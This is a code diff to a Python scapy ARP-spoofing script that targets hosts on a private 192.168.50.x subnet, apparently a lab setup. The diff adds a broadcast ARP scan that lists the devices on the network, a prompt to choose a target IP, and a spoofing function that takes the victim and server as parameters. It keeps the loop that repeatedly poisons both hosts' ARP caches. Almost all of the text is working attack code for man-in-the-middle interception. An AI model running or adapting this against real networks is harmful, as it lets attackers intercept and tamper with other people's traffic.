@@ -5,6 +5,7 @@ import time
 VICTIM_IP = "192.168.50.20"
 SERVER_IP = "192.168.50.30"
 INTERFACE = "eth1"
+NETWORK_RANGE = "192.168.50.0/24"
 
 #Get mac adress of the victim
 
@@ -30,12 +31,12 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip_mac, psrc=source_ip, hwsrc=source_ip_mac)
     scapy.sendp(ether_frame / packet, count=5, verbose=False, iface=INTERFACE)
 
-def run_spoofing():
+def run_spoofing(victim=VICTIM_IP, server=SERVER_IP):
     sent_packets_count = 0
     try:
         while True:
-            spoof(VICTIM_IP, SERVER_IP)
-            spoof(SERVER_IP, VICTIM_IP)
+            spoof(victim, server)
+            spoof(server, victim)
             
             sent_packets_count = sent_packets_count + 2
             print(f"\r[+] Packets Sent: {sent_packets_count}", end="")
@@ -44,7 +45,26 @@ def run_spoofing():
 
     except KeyboardInterrupt:
         # Restore only while testing
-        restore(VICTIM_IP, SERVER_IP)
-        restore(SERVER_IP, VICTIM_IP)
+        restore(victim, server)
+        restore(server, victim)
 
-run_spoofing()
+def main():
+    request = scapy.ARP(pdst=NETWORK_RANGE)
+    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = ether / request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]
+
+    hosts = []
+
+    for sent, received in answered_list:
+        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
+    print("Available devices in the network:")
+    print("IP\t\t\tMAC Address\n-----------------------------------------")
+    for host in hosts:
+        print(f"{host['ip']}\t\t{host['mac']}")
+    request_input = input("Select the target IP address: ")
+    if request_input in [host['ip'] for host in hosts]:    
+        run_spoofing(request_input)
+
+if __name__ == "__main__":
+    main()
